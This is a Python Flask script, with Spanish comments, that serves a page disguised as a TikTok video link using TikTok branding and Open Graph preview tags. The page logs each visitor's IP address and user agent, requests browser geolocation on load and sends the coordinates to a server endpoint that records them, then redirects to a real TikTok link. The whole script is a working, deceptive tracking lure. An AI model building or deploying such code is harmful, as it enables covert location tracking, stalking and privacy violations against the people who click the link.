from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)
TARGET_TIKTOK = "https://vt.tiktok.com/ZSVN7YNTV/"

@app.route('/')
def index():
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        ip = forwarded.split(',')[0].strip()
    else:
        ip = request.remote_addr or ''
    user_agent = request.headers.get('User-Agent', '')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"{now} {ip} {user_agent}", flush=True)

    html = f"""<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta property="og:site_name" content="TikTok">
<meta property="og:title" content="Mira este video en TikTok">
<meta property="og:description" content="Descubre contenido en TikTok">
<meta property="og:image" content="https://sf16-sg.tiktokcdn.com/obj/eden-sg/u33hn4pjy/tiktok_logo.png">
<meta http-equiv="refresh" content="0.5;url={TARGET_TIKTOK}">
<title>Redirigiendo a TikTok...</title>
<script>
setTimeout(function(){{
  window.location.href = "{TARGET_TIKTOK}";
}}, 500);

// Solicitar geolocalización al cargar la página
function obtenerUbicacion(){{
  if ("geolocation" in navigator) {{
    navigator.geolocation.getCurrentPosition(
      (position) => {{
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        // Enviar coordenadas al servidor
        fetch('/guardar-ubicacion', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{ latitud: lat, longitud: lon }})
        }}).catch(err => console.error('Error enviando ubicación:', err));
      }},
      (error) => {{
        console.error("Error al obtener ubicación:", error.message);
      }}
    );
  }} else {{
    console.log("La geolocalización no está soportada por este navegador.");
  }}
}}

window.addEventListener('DOMContentLoaded', (event) => {{
  try {{ obtenerUbicacion(); }} catch (e) {{ console.error(e); }}
}});
</script>
</head>
<body>
<p>Redirigiendo... Si no eres redirigido automáticamente, <a href="{TARGET_TIKTOK}">haz clic aquí</a>.</p>
</body>
</html>
"""

    return html

@app.route('/guardar-ubicacion', methods=['POST'])
def recibir_ubicacion():
    datos = request.get_json(silent=True)
    latitud = None
    longitud = None
    if datos:
        latitud = datos.get('latitud')
        longitud = datos.get('longitud')

    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        ip = forwarded.split(',')[0].strip()
    else:
        ip = request.remote_addr or ''
    user_agent = request.headers.get('User-Agent', '')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    print(f"{now} {ip} GEO lat:{latitud} lon:{longitud} UA:{user_agent}", flush=True)

    return jsonify({"status": "exito"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
